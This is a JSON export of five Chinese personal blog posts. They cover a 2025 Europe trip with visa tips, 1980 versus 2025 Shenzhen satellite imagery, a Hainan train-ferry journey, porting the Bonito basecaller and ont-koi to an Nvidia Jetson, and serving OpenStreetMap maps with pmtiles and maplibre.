[{"content":"时隔两年，笔者在研究生毕业之际又去了一次欧盟。这次笔者去到了法国开会，并在开会后前往意大利和瑞士转了几天。\n行前准备及杂项 签证 整个签证申请流程和2023年的流程类似。由于会议下发邀请函的时间较晚，笔者在出发前一个半月预约的签证，只约到了tlscontact的“优选时间（即需要加380一个人的服务费）”。关于开会应该申请的签证类型，网上有说按照商务（Business）申请的，也有说按照文化交流（Art Sceince Sport）申请的。理论上任选其中一个类别申请即可。\n文件 备注 护照原件 护照复印件（有章/签证的位置与信息页） 所有的复印件都可以用黑白的 申请表打印签名 申请表也可以是黑白的，出生地写省份（而不是城市）。申请表如果有小错误，是可以在签证中心手写改正的。 证件照2张（ICAO格式） 内地身份证复印件 户口本复印件 在读证明 建议签名（签名的人可以是辅导员导师等普通教授，不一定需要是教务处/注册负责人之类的） 银行结单 近3个月，大约有3-5万元的结余即可 会议邀请函 需要有参会人的名字，最好有护照号。 行程单 由于笔者在开完会之后还要去意大利休闲旅行，因此做了一个行程单。如果只开会是不需要的（签证中心的原话）。 机票预定 笔者处于对签证下签的信心，依然是直接定好了机票。 酒店预订 可以在booking上定可退的酒店，注意需要把同行人也加入到住客名单里 保险单 可以在支付宝里搜索安联，然后就能找到可用的申根区保险。保险的覆盖时间似乎和签证有效期（允许逗留的天数）有关，如果希望获得一个略长一点逗留天数，保险可以买一个月的。 机票 这次笔者买的是汉莎集团LHG的基础票价，去程HKG-FRA-CDG，回程CDG-ZRH-HKG，一共花费约4500HKD（但注意这个档位的机票是没有免费选座和托运的（但如果飞机快满了会给offer托运登机箱，笔者来回都成功托运了行李箱）。此次行程笔者还顺带体验到了汉莎航空的A340，据说是要在今年下半年或者明年退役了。\n电话卡 笔者在飞猪某家店铺购买的orange.es和3uk的预付卡，这些卡目前都支持esim，因此就算不从中国大陆出发，也可以购买这些卡。其中3uk的卡在法国和瑞士还有5G，速度很快。\n气候 巴黎如果不下雨温度一般在20-30度之间。可以全天穿短袖。意大利会更热一些，全天维持在25度以上。\nDay 1 香港 - 法兰克福 - 巴黎 由于笔者购买的是最便宜的机票档位，没有免费选座，被安排到了飞机中间的座位，因此飞行中没能拍下任何照片。A340和A330一样是2-4-2座位配置，相比777座椅宽度会大一些。香港-法兰克福提供一餐晚餐，一餐早餐。晚餐可选意大利面和辣子鸡饭（吃起来可能更像黄焖鸡一点），早餐是欧姆蛋配薯饼。乘坐汉莎的话可以尝试一下他们特有的Avionic气泡酒，挺好喝的。\nA340的客舱 下飞机时拍的A340外景 汉莎老巢，A340，747-400和747-800 法兰克福-巴黎安排的是一架A319，飞行时间只要一个小时出头。\nCDG Terminal 1 RERB CDG T2 巴黎的公共交通卡Navigo现已支持Apple Pay / Android HCE了。但买周票需要注册一个账号，注册账号需要一个EEA手机号验证 巴黎内环高速 在酒店住下之后，笔者就和朋友去城内四处转了转。开始转之前我们在酒店附近找了一家突尼斯风味餐厅SIDIBOU KB，每个人点了一份库斯库斯配羊肉/鱼肉，吃起来有点像小米。\n库斯库斯 由于笔者的朋友是第一次来巴黎，就和他们去巴黎的几个经典地标转了一圈。巴黎圣母院这次来时已经基本修复，可以入内参观了。\n巴黎圣母院 巴黎圣母院内部 凯旋门 埃菲尔铁塔的进门（去塔底）不需要门票，上塔分三种：走楼梯上塔的第二层（中间的平台）；坐电梯上塔的第二层；坐电梯上塔顶。坐电梯上塔顶的票比较抢手，我们提前三四周定的时候已经售罄了，因此我们选择购买了走楼梯上塔的第二层的票。如果愿意在塔上呆到日落（在夏天可能要到快22:00），第二层的风景也非常不错。\n埃菲尔铁塔下，在Rue de Monttessuy这条街拍的 铁塔东北侧，可以看到圣心大教堂 铁塔西北面的特罗卡德罗宫和远处的CBD 跨过塞纳河的地铁6号线 日落时分 Day 2 巴黎 会议在Day3才正式开始，这天笔者跟同学去圣心大教堂一带转了一圈，中午在Le Bistrot Du Perigord吃了他们的set menu。除了价格有点小贵之外都不错。\n一辆一代甲壳虫 蒙马特高地附近的街景 上下山的巴士，两年过去巴黎的许多公交车也纯电化了 Corvisart地铁站 Day 3-6 巴黎 这几天笔者都在参加会议。其中一天的晚上会议主办方组织了一次塞纳河游船晚餐，可以乘坐一艘玻璃壳的游船从凯旋门附近开到巴黎圣母院再折返。\n游船晚餐用的类似船 坐在河岸边的人 经过桥上的地铁 巴黎自由女神像 船上拍到的埃菲尔铁塔 坐在河边的人 凑巧的是开会的其中一天晚上正好也是巴黎的仲夏节（Midsummer\u0026rsquo;s Day），晚上塞纳河旁人潮汹涌。\nLe Limousin的油封鸭腿，只要14EUR PIDS上，地铁通宵运行的告示 等地铁的人群 街边的乐队 Pont Neuf 河上的法国国旗色游船 开会完之后的一天笔者和朋友逛了一整天卢浮宫，从九点半一直逛到了下午四点左右。\n《蒙娜丽莎》，这次去的时候画前没有人维持秩序，所有的游客都是需要自己慢慢往前挤才能看到画 卢浮宫里的电梯 卢浮宫外的鸽子 巴黎奥运会的圣火塔 方尖碑 一处街道 日落时的住宅楼 Day 8 罗马 法航的A320ceo，用的还是最老的机内装修 罗马的海岸 罗马FCO机场的控制塔 Roma Termini 火车站 古罗马遗迹，遗迹里有许多海鸥 古罗马遗迹，遗迹里有许多海鸥 夜晚的斗兽场 斗兽场旁的夜景，位于Ponte degli Annibaldi附近 罗马地铁，笔者去的那几天刚刚支持AMEX过闸（以前已经支持了Visa/Master/银联），因此做了许多广告 罗马地铁1号线，涂装和车玻璃的形状看起来很像深圳地铁11号线的车 万神殿 万神殿 圣保罗大教堂 Day 9 米兰 罗马前往米兰的ETR1000列车，外形和CRH380D有些类似 米兰的传统电车 米兰地铁一号线 米兰大教堂 AC米兰主场Stadio San Siro 从LIN机场起飞后，看到的米兰市区 Day 10 苏黎世 CDG-ZRH途中风景 瑞士铁路 Grossmünster 水上的士 苏黎世湖 桥上的电车和行人 苏黎世机场 瑞士航空777 \u0026ldquo;Good Bye, See You Soon\u0026rdquo; ","permalink":"https://blog.sparktour.me/posts/2025/07/20/2025-summer-europe-travel-notes/","summary":"\u003cp\u003e时隔两年，笔者在研究生毕业之际又去了一次欧盟。这次笔者去到了法国开会，并在开会后前往意大利和瑞士转了几天。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003ch1 id=\"行前准备及杂项\"\u003e行前准备及杂项\u003c/h1\u003e\n\u003ch2 id=\"签证\"\u003e签证\u003c/h2\u003e\n\u003cp\u003e整个签证申请流程和2023年的流程类似。由于会议下发邀请函的时间较晚，笔者在出发前一个半月预约的签证，只约到了\u003ca href=\"https://visas-fr.tlscontact.com/\"\u003etlscontact\u003c/a\u003e的“优选时间（即需要加380一个人的服务费）”。关于开会应该申请的签证类型，网上有说按照商务（Business）申请的，也有说按照文化交流（Art Sceince Sport）申请的。理论上任选其中一个类别申请即可。\u003c/p\u003e","title":"2025再访欧盟"},{"content":"笔者最近网上冲浪时看到了一篇有关如何从USGS Earth Explorer上下载历史卫星图像的文章，于是实战了一下，使用QGIS对齐了1980年9月11日（来自USGS Earth Explorer）和2024-2025年（来自Google Earth）的深圳市区卫星图，并对一些深圳的特色地点做了比较。\n本文使用的1980年卫星图来自USGS，2025年卫星图来自Google，街道路网来自OpenStreetMap。 深圳市 在1980年的深圳卫星图里，一眼能够辨别出来的元素只有铁岗水库（左侧湖泊），西丽水库（旧称西沥水库，中部湖泊）和深南大道/广深公路G107了（下方白色道路）。因此将这张1980年的卫星图对齐到现在的卫星图也花费了笔者不少时间。\n福田中心区 福田中心区 1980年的福田中心区全是水田和鱼塘，大型的现代建设只有深南大道。\n布吉，深圳东站 深圳东站 1980年已经有了九广铁路，从卫星图里能依稀看到布吉站（现在是深圳东站）和布吉老街，2025年的地图里也能看到布吉老街，但已经隐没在城中村里了。\n罗湖 罗湖 1980年的卫星图里能清晰看到深圳火车站，罗湖口岸，香港一侧的罗湖站和治理前的深圳河河道。\n东门 东门 1980年的地图上可以模糊的看到东门中路和深南东路，东门一带的村落现在已经变成了写字楼和商业街（商业街大约是1990年初建设的）。\n笋岗客技站 笋岗客技站 笋岗客技站（2000年代初也叫深圳北站）始建于1962年，因此也出现在了1980年的卫星地图上。当时的笋岗客技站只有几条侧线，还没有北侧的那些车辆段设施。\n上下沙，福田街道 上下沙 上下沙在1980年就已经形成了一个比较大的村落。至今这里还是大致保持了城中村的布局，不过楼房比1980年多了很多。\n华强北 华强北 1980年时的华强北西侧已经做好了土地平整，准备建设深纺大厦。深纺大厦至今依然存在。\n荔枝公园 荔枝公园 1980年的荔枝公园街区还是水田和若干个山包。中间的山包上可以看到五栋楼房，根据一些回忆录文章，那几栋楼房可能就是现在通新岭小区的其中几栋住宅。\n1981年年底，市委、市政府机关搬到上埗岭上新建的办公楼。党政机关都在这座还没有电梯更没有空调、高6层的楼里。干部宿舍建在办公楼后面的通心岭（现“通新岭”）上。最初只有5栋6层的水泥砖结构宿舍楼，一套房要住几个（户）干部。我从新园招待所入住通心岭宿舍时连床板也没有，只好向“老宝安”的同事借用。宿舍区还经常断电断水，周围的道路都是崎岖的沙土小路，几公里内没有市场。 《文化深圳》：峥嵘拓荒岁月 躬行报业历程\n左下角的厂房可能是用于建设市委时临时建设的。\n香蜜湖 香蜜湖 香蜜湖曾经的名字叫香茅场水库，看起来1980年的时候还是作为水库在运行，湖面面积也比现在大一些。\n深圳北站 深圳北站 1980年的深圳北站一带只有一些丘陵和少量的村落。\n大学城 大学城 除了西丽水库和长岭陂水库，其他的地面建筑已经没有任何相似性了。\n高峰水库 高峰水库 高峰水库的面积相比1980年有所缩小，南侧也多出了一个高铁车辆段。\n深圳水库 高峰水库 深圳水库的形状和45年前的没有太大差别，当时水库旁就已经有了一些村落。\n华侨城 华侨城，欢乐海岸 欢乐海岸和超级总部都是2000年代初修建滨海大道时填海出来的部分，这一片在1980年的地图上还是深圳湾的一部分。\n南山区，宝安区南部 南山区，宝安区南部 大铲湾，前海 大铲湾，前海 大铲湾和前海湾的许多地块也是填海建成的，2025年的前海一带已经没有任何自然海岸线了。\n后海 后海 后海的人才公园一代也是填海形成的，在1980年的卫星图里还是一片水域。\n深圳大学 深圳大学 1980年时深圳大学还没有开始建设，但可以看到深大所在的地块是非常靠近深圳湾的。当年深大刚建好时说可以在教学楼看到海边看来也是合理的。\n大新 大新 大新一代在1980年就有了不少村落和建筑，相信可能是由于其临近广深公路。2025年的卫星图里，先前村落的位置依然是城中村。\n深圳机场 深圳机场 深圳机场一带在1980年还是珠江的一部分。\n塘朗山 塘朗山 塘朗山依旧还是塘朗山，不过山的周围由农田和村落变成了高楼。\n参考资料 1980年的卫星图片： https://earthexplorer.usgs.gov/scene/metadata/full/5e7c41f3ffaaf662/D3C1216-300662F047/ ，笔者使用了图a。 QGIS georeferencing： https://www.youtube.com/watch?v=XV62QEk0Cxg ","permalink":"https://blog.sparktour.me/posts/2025/04/16/shenzhen-1980-2025/","summary":"\u003cp\u003e笔者最近网上冲浪时看到了一篇有关如何从\u003ca href=\"https://earthexplorer.usgs.gov/\"\u003eUSGS Earth Explorer\u003c/a\u003e上下载历史卫星图像的\u003ca href=\"https://zhuanlan.zhihu.com/p/30953275\"\u003e文章\u003c/a\u003e，于是实战了一下，使用QGIS对齐了1980年9月11日（来自\u003ca href=\"https://earthexplorer.usgs.gov/scene/metadata/full/5e7c41f3ffaaf662/D3C1216-300662F047/\"\u003eUSGS Earth Explorer\u003c/a\u003e）和2024-2025年（来自\u003ca href=\"https://about.google/brand-resource-center/products-and-services/geo-guidelines/\"\u003eGoogle Earth\u003c/a\u003e）的深圳市区卫星图，并对一些深圳的特色地点做了比较。\u003c/p\u003e","title":"1980-2025：45年前的深圳卫星图"},{"content":" 笔者在2025年初春的某个周末，突发奇想想体验一下火车轮渡过海的体验，于是选择了一个周末去海南的海口，文昌玩了一圈。\n目前经过粤海铁路从广东前往海南岛的普速列车一共只有不到10对，其中包括了去上海松江的K512，去深圳东的Z8008（这是笔者本次乘坐的列车），去长春的Z386，去哈尔滨的Z112（这两趟去东北的普速都要开快三天）和去北京的Z201（这趟车终到三亚，还会在海南西环铁路上运行一段）。 火车轮渡 考虑到最大化利用周末的休息时间，笔者购买了周五出发的Z8006（深圳东-海南）和周日出发的Z8008，这样就可以在海南呆上一天半左右了。Z8006/Z8008由广铁运营，整条路线都没有离开广铁的管辖范围。去程晚上七点左右从深圳东发车，第二天早上到海口。列车有硬座，硬卧，软卧和高级软卧（两人一间的包厢，带独立卫生间）。另外，笔者和列车员在闲聊的时候还得知，在列车的过海段（徐闻-海口）段，考虑到轮渡的过海人数限制，列车在这段是无法满载的，因此包含这一段的车票在旅客到达一定人数之后就不再售卖了（会在12306上显示“候补”）。\n深圳东站站台 深圳东站站台 硬卧铺位，可能因为这列车一般只在广东省内运行，因此车内的卫生状况一般，卧铺座位下还能看到一些上一班乘客留下的瓜子壳等垃圾 广州白云站，对面是广深城际 第二天早上七八点时，列车已经离开了徐闻站，开始排队等待上船。这条铁路轮渡线路除了客车，还有一些散货车过海。\n列车一共有16节，最终会被分成5+5+3+3一共4段上船。首先，列车会从中间断开分成8+8两节，然后由调机推上船的外侧。接着，两组里车会再各被拆解成3+5节，由调机通过岔道再次推上船。相比在港口直接把车拆成4段，这么做也节省了两台调机。但带来的弊端就是拆解列车和推上船的耗时较久，从列车拆解到全部推上船花费了差不多一小时。\n列车分段并接上发电机车 铁路栈桥 列车上船之后并不允许乘客下车，因此笔者也只能在车厢内等待列车过海。运载火车过海的轮船一共有粤海铁1号-4号4艘轮渡，排水量都超过了10000吨，因此乘坐起来感觉非常平稳，如果不看车尾的话甚至感受不到列车正在过海。\n从列车内看船尾，船的侧面只有前半部份开放，后半部份是没有窗户的 轮渡航行约半小之后就抵达了海口的北港轮渡码头，尽管这个码头离海南站只有一公里左右的距离，但被拆段的列车依然需要被拼合起来再进站（考虑到轮渡还运送散货车和到三亚的列车，因此拼接列车可能是标准操作），因此又花费了约一小时的时间。\n下船后，调机正在组合列车 海口 海口站 到达海口站后，笔者和朋友租了一辆大众的T-ROC。海南公路系统的一大特点是不收高速费用，高速费用被直接加在了油价里。因此海南的油价单价比广东贵了大约1-2元。\n海口老街，和潮汕福建等地的骑楼风格很想 海口免税城，设置在轮渡港口旁边。商场内主要是一些奢侈品牌和少量餐饮。笔者去的时候可能因为是淡季，人并没有很多。 海口－琼海高速公路，和海南环岛高铁并行 文昌 从海口开车一个小时左右就能到文昌，文昌的城区并不大，城内也没有太多高楼。\n文昌鸡，口感类似海南鸡饭里的鸡肉 文昌街景，和珠三角一带的城中村类似 晚上笔者去海边转了一圈，文昌南侧的沙滩上有一个「逸龙湾海上图书馆」，是一些木结构房屋组成的栈道，晚上会亮灯，效果比较赛博朋克。\n逸龙湾海上图书馆 逸龙湾海上图书馆，远处可以看到沙滩上的灯光 次日早上笔者经海南环岛公路，逆时针开回了海口。\n文昌商业航天发射场，发射长征系列火箭的发射场并不让进入，发射时也只能在海滩边远眺 海南环岛旅游公路 路边的椰子树，可以看到有往同一个方向吹的痕迹，笔者猜测可能是2024年台风摩羯导致的 不少路段的海边配置了骑行路 骑行驿站 一处海滩 木兰湾灯塔 新海港客运大楼 新海港汽车入口 回程列车 回程笔者依然乘坐的是海口-深圳东的普速列车。回程的天气相比去程好不少。\n海口站 高级软卧走廊 高级软卧包厢 衣柜下面甚至还有一个保险箱 北港站，未来徐闻一侧的车站建好后，旅客会在这里换乘客轮 上轮渡之前的道岔，两条股道被分成了4条 列车被分段推上轮渡 窗边日落 列车离开轮渡 等待上船的罐车 附一个OSMO Pocket拍的视频：\n","permalink":"https://blog.sparktour.me/posts/2025/03/15/hainan-train-ferry-trip/","summary":"\u003cblockquote\u003e\n\u003cp\u003e笔者在2025年初春的某个周末，突发奇想想体验一下火车轮渡过海的体验，于是选择了一个周末去海南的海口，文昌玩了一圈。\u003c/p\u003e\u003c/blockquote\u003e\n\u003c!-- more --\u003e\n\n \n\u003cdiv class=\"callout callout-info\"\u003e\n    目前经过\u003ca href=\"https://zh.wikipedia.org/wiki/%E7%B2%A4%E6%B5%B7%E9%93%81%E8%B7%AF\"\u003e粤海铁路\u003c/a\u003e从广东前往海南岛的普速列车一共只有不到10对，其中包括了去上海松江的K512，去深圳东的Z8008（这是笔者本次乘坐的列车），去长春的Z386，去哈尔滨的Z112（这两趟去东北的普速都要开快三天）和去北京的Z201（这趟车终到三亚，还会在海南西环铁路上运行一段）。\n\u003c/div\u003e\n\n\u003ch2 id=\"火车轮渡\"\u003e火车轮渡\u003c/h2\u003e\n\u003cp\u003e考虑到最大化利用周末的休息时间，笔者购买了周五出发的Z8006（深圳东-海南）和周日出发的Z8008，这样就可以在海南呆上一天半左右了。Z8006/Z8008由广铁运营，整条路线都没有离开广铁的管辖范围。去程晚上七点左右从深圳东发车，第二天早上到海口。列车有硬座，硬卧，软卧和高级软卧（两人一间的包厢，带独立卫生间）。另外，笔者和列车员在闲聊的时候还得知，在列车的过海段（徐闻-海口）段，考虑到轮渡的过海人数限制，列车在这段是无法满载的，因此包含这一段的车票在旅客到达一定人数之后就不再售卖了（会在12306上显示“候补”）。\u003c/p\u003e","title":"粤海铁路与海南之旅"},{"content":"Jetson是Nvidia推出的一款嵌入式AI计算平台，相比笔记本电脑和服务器，Jetson具有更小的体积和更低的功耗，适合部署在边缘设备上。Oxford Nanopore Technology也曾基于Jetson平台发布了MinION Mk1C，用于实时测序数据的分析。本文介绍了如何在Jetson上安装并运行Bonito Basecaller，以便在边缘设备上进行实时测序数据的分析和模型训练。\n本文基于运行Jetson Linux 35.2.1的Jetson Xavier NX开发板，其他Jetson设备可能需要稍作调整。\n$ uname -r 5.10.216-tegra $ nvcc --version nvcc: NVIDIA (R) Cuda compiler driver Copyright (c) 2005-2022 NVIDIA Corporation Built on Sun_Oct_23_22:16:07_PDT_2022 Cuda compilation tools, release 11.4, V11.4.315 Build cuda_11.4.r11.4/compiler.31964100_0 确保CUDA依赖 Bonito Basecaller是基于CUDA的深度学习模型，因此需要确保CUDA的依赖已经安装。在使用sdkmanager安装Jetson Linux的过程中，需要选择安装CUDA Toolkit，确保CUDA的依赖已经安装。进入系统后，可以通过以下命令检查CUDA的版本：\n$ nvcc --version nvcc: NVIDIA (R) Cuda compiler driver Copyright (c) 2005-2022 NVIDIA Corporation Built on Sun_Oct_23_22:16:07_PDT_2022 Cuda compilation tools, release 11.4, V11.4.315 Build cuda_11.4.r11.4/compiler.31964100_0 安装Conda 为了避免与系统的Python环境冲突，我们可以使用Conda来创建一个独立的Python环境。首先，我们先创建Conda环境：\nconda create -n bonito-py38-081 conda activate bonito-py38-081 并在该环境中安装Python 3.8：\nconda install python=3.8 安装Bonito 观察Bonito的requirements.txt文件，我们可以看到Bonito依赖于以下Python库：\n# general requirements edlib fast-ctc-decode mappy networkx # required for py3.8 torch compatability numpy\u0026lt;2 # numpy~=2 is currently unreleased, it may have breaking changes pandas\u0026lt;3 # pandas~=3 is currently unreleased, it may have breaking changes parasail pod5 pysam python-dateutil requests toml tqdm wheel # specific requirements torch==2.1.2 # ont requirements ont-fast5-api ont-koi ont-remora 经过笔者的测试，在arm64架构上会出现兼容性问题的包主要集中于torch和ont-koi这两个包。其中PyTorch是需要安装nvidia提供的torch包，而ont-koi则需要移植dorado的koi库。\nPyTorch 根据Nvidia的文档和兼容性矩阵表格，我们可以安装距离Pytorch 2.1.2最接近的版本2.1.0a（请根据实际的Jetpack Linux版本选择合适的PyTorch版本）：\n# Download the PyTorch wheel file wget https://developer.download.nvidia.com/compute/redist/jp/v512/pytorch/torch-2.1.0a0+41361538.nv23.06-cp38-cp38-linux_aarch64.whl # Install numpy and pandas pip install \u0026#34;numpy\u0026lt;2\u0026#34; \u0026#34;pandas\u0026lt;3\u0026#34; # Install PyTorch pip install torch-2.1.0a0+41361538.nv23.06-cp38-cp38-linux_aarch64.whl 安装完成后，可以通过以下命令确定pytorch读到了Jetson的GPU：\npython3 \u0026gt;\u0026gt;\u0026gt; import torch torch.cuda.get_device_name(0) \u0026gt;\u0026gt;\u0026gt; torch.cuda.get_device_name(0) \u0026#39;Xavier\u0026#39; ont-koi 编译so文件 由于ONT只提供了适用于x86_64架构的koi库，我们需要自行移植koi库到arm64架构。笔者经过观察，在Dorado的Koi.cmake里发现了预编译好的koi包，我们可以直接下载并编译出so文件。我们首先从ONT下载koi包：\n# Download the koi package wget https://cdn.oxfordnanoportal.com/software/analysis/libkoi-0.4.3-Linux-aarch64-cuda-11.4.tar.gz tar -zxvf libkoi-0.4.3-Linux-aarch64-cuda-11.4.tar.gz 随后，在文件夹里新建一个setup.py：\nimport os from cffi import FFI ffi = FFI() def build_koi(): with open(\u0026#34;include/koi.h\u0026#34;, \u0026#39;r\u0026#39;) as f: header_content = f.read() ffi.cdef(header_content) ffi.set_source( \u0026#39;koi._runtime\u0026#39;, \u0026#39;#include \u0026lt;koi.h\u0026gt;\u0026#39;, include_dirs=[\u0026#39;./include\u0026#39;], # include library_dirs=[\u0026#39;./lib\u0026#39;], # lib libraries=[\u0026#39;koi\u0026#39;], # link libkoi.a extra_link_args=[\u0026#39;-Wl,-rpath,$ORIGIN/lib\u0026#39;] ) ffi.compile() if __name__ == \u0026#39;__main__\u0026#39;: build_koi() 并运行该脚本。编译完成后，我们可以在当前目录下找到_runtime.cpython-38-aarch64-linux-gnu.so文件。\n笔者在此也提供预编译好的so文件，供读者使用： https://assets.sparktour.me/img/blog/2025/port-ont-bonito-koi-to-jetson-arm64/_runtime.cpython-38-aarch64-linux-gnu.so.tar.gz 安装ont-koi 由于koi的架构不同，我们需要手动安装ont-koi：\n# 我们先下载x86_64架构的whl包 wget https://files.pythonhosted.org/packages/fe/68/4bb9241c65d6c0c51b6ae366b5dedda2e8a41ba17d2559079ee8811808ef/ont_koi-0.4.4-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl # 解压 wheel 文件（wheel 本质上是一个 zip 文件） unzip ont_koi-0.4.4-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl -d ont_koi_temp # 找到 Python 的 site-packages 目录 SITE_PACKAGES=$(python -c \u0026#34;import site; print(site.getsitepackages()[0])\u0026#34;) # 直接复制文件到 site-packages（但注意备份） cp -r ont_koi_temp/koi $SITE_PACKAGES/ cp -r ont_koi_temp/ont_koi.libs $SITE_PACKAGES/ cp -r ont_koi_temp/ont_koi-0.4.4.dist-info $SITE_PACKAGES/ # 替换 so 文件 cp /path/to/your/new/_runtime.cpython-38-aarch64-linux-gnu.so $SITE_PACKAGES/koi/_runtime.abi3.so 安装Bonito 我们先下载Bonito的源码：\ngit clone https://github.com/nanoporetech/bonito cd bonito 注释掉requirements.txt里torch和ont-koi的依赖，然后安装Bonito：\npip install . 运行Bonito bonito basecaller dna_r9.4.1_e8_sup@v3.3 --reference reference.mmi /data/reads \u0026gt; basecalls.bam ","permalink":"https://blog.sparktour.me/posts/2025/01/25/port-ont-bonito-koi-to-jetson-arm64/","summary":"\u003cp\u003e\u003ca href=\"https://www.nvidia.com/en-us/autonomous-machines/embedded-systems/\"\u003eJetson\u003c/a\u003e是Nvidia推出的一款嵌入式AI计算平台，相比笔记本电脑和服务器，Jetson具有更小的体积和更低的功耗，适合部署在边缘设备上。Oxford Nanopore Technology也曾基于Jetson平台发布了\u003ca href=\"https://nanoporetech.com/document/requirements/minion-mk1c-spec\"\u003eMinION Mk1C\u003c/a\u003e，用于实时测序数据的分析。本文介绍了如何在Jetson上安装并运行Bonito Basecaller，以便在边缘设备上进行实时测序数据的分析和模型训练。\u003c/p\u003e","title":"在 Nvidia Jetson 上运行 Bonito Basecaller"},{"content":"前言 笔者曾在三年前写过一篇如何self host基于OpenStreetmap数据的博客。在当时的文章里，笔者使用的后端是maptiler开发的的tileserver-gl。它需要一个转换好的mbtiles文件，才能正常serve地图。但遗憾的是，maptiler把下载转换好的地图作为一项商业服务提供，我们只能自己使用maptiler提供的openmaptiles对地图进行转换。由于mbtiles的本质是基于sqlite的地图数据库，使用openmaptiles制作地图的速度相当缓慢（在一台48C256G的机器上转换全世界的地图大概需要一整天的时间，并且对磁盘的IO有较高的要求），host地图也需要使用tileserver-gl处理请求，将mbtiles里的数据转换成pbf格式发送给客户端。\n直到最近，笔者注意到了一些GIS开源项目在使用的Protomaps项目，以及他们提出的pmtiles格式。如Protomaps的发起人给博客起的标题《Dynamic Maps, Static Storage》那样，pmtiles的一大优势是如果不需要raster tiles，服务端不再需要安装任何软件，只需要一个“Static Storage”即可（无需任何后端软件对地图数据进行处理）。确切的说，一个支持HTTP Range的服务器。包括nginx，caddy等常见的web服务器和S3服务理论上都是支持这项特性的。\npmtiles格式的设计理念 Pmtiles的格式设计巧妙的利用了HTTP Range的特性。如下图所示，它将图块数据的索引放在了文件的头部，因此客户端只要先对文件的头部进行查询，得到图块索引后，根据Z、X、Y找到对应的数据range，最后再使用HTTP Range请求对应的数据块即可。\npmtiles格式的设计理念，来自Protomaps博客 获取一个图块的过程如下（假设我们要获取z:8 x:65 y:95）：\n获取前 512 千字节并将目录解析为索引 在这种情况下，通过您想要的图块的键查找8_65_95 匹配成功！您将获得一个Rangeoffset: 785366 length: 21400 使用HTTP Range获取这些字节Range:bytes=785366-806765并将数据解析为图像 但值得注意的是，当整个文件足够大的时候，图块索引本身也可能占用大量的体积（如博客文章所说，如果我们要存储1-15这15个缩放登记的索引，索引本身的体积可能就高达6G。这对在线地图服务依然是难以接受的。pmtiles对此的解决方案是再添加一个中间层（类似索引的索引），第一个索引只负责缩放级别0-7，如果我们要查找的图块缩放级别大于7，则找到位置对应的缩放级别7的图块后，再检查文件是否有提供叶目录（leaf directory）存储更详细的缩放级别，如果有，重复上述查找过程即可。\nLeaf Directory，来自Protomaps博客 如何使用叶目录查找z:14 x:4204 y:6090：\n获取前512千字节，解析根索引。 检查根索引中的14_4204_6090。由于根目录只包含 0-7 级，相关的位置不存在于根索引里。 检查根索引中是否存在父图块的叶目录条目。z:14 x:4204 y:6090的父图块是z:7 x:32 y:47。 获取叶索引的字节并将其解析到索引中。 使用字节偏移量和图块数据长度来索引14_4204_6090。 只要客户端缓存最近使用的索引表，并且缩放/平移保持在z:7 x:32 y:47这个大图块内，则客户端无需多次提取索引。\n迁移mbtiles到pmtiles 数据源 相比mbtiles下载需要收费（免费层级只能下载2020年的数据），Protomaps在 https://maps.protomaps.com/builds/ 提供了每日更新的地图数据，直接点击下载即可。如果不需要整个星球的数据，也可以在用pmtiles CLI，根据geojson来提取部分数据下载。\n后端 将下载下来的pmtiles放在任何支持HTTP Range的web server或者对象存储上即可，除了CORS之外无需做任何特别配置。对于比较小的地图，放在github.io等静态网页存储服务上都是可行的。\n前端 js protomaps也提供了针对maplibre-gl-js的集成，只需要再引入一个pmtiles.js，并在js里注册这个protocal即可：\nlet protocol = new pmtiles.Protocol({metadata: true}); maplibregl.addProtocol(\u0026#34;pmtiles\u0026#34;, protocol.tile); style json 可以在 https://maps.protomaps.com/ 上点击Get Style Json生成，生成后记得修改source里的url（改为类似pmtiles://https://url.com/example.pmtiles的格式）：\n\u0026#34;sources\u0026#34;: { \u0026#34;protomaps\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;vector\u0026#34;, \u0026#34;attribution\u0026#34;: \u0026#34;\u0026lt;a href=\\\u0026#34;https://github.com/protomaps/basemaps\\\u0026#34;\u0026gt;Protomaps\u0026lt;/a\u0026gt; © \u0026lt;a href=\\\u0026#34;https://openstreetmap.org\\\u0026#34;\u0026gt;OpenStreetMap\u0026lt;/a\u0026gt;\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;pmtiles://https://url.com/example.pmtiles\u0026#34; } }, 示例网页：\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;PMTiles MapLibre Example\u0026lt;/title\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;/\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://unpkg.com/maplibre-gl@4.7.0/dist/maplibre-gl.css\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/maplibre-gl@4.7.0/dist/maplibre-gl.js\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/pmtiles@4.2.1/dist/pmtiles.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; body { margin: 0; } #map { height:100%; width:100%; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;map\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; // add the PMTiles plugin to the maplibregl global. // setting metadata = true fills out the \u0026#34;attribution\u0026#34; field of the source, and is required for some inspector applications, // but requires an additional blocking HTTP request before loading the map. let protocol = new pmtiles.Protocol({metadata: true}); maplibregl.addProtocol(\u0026#34;pmtiles\u0026#34;, protocol.tile); const map = new maplibregl.Map({ container: \u0026#34;map\u0026#34;, zoom: 13, center: [11.2543435, 43.7672134], style: \u0026#34;pmtiles-light.json\u0026#34;, }); map.showTileBoundaries = true; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 如果需要在本地host style里的sprite，字体等文件，可以在 https://github.com/protomaps/basemaps-assets/ 里下载。 经过笔者测试，在修改完数据源和style json之后，Protomaps的配置可以和maplibre-gl-js无缝兼容，无需进去其他的代码修改。\n显示效果 在地图上叠加了geojson和数个marker（车辆） 底图多语言显示（可以在style json里配置） 参考文档 https://protomaps.com/blog/dynamic-maps-static-storage/ 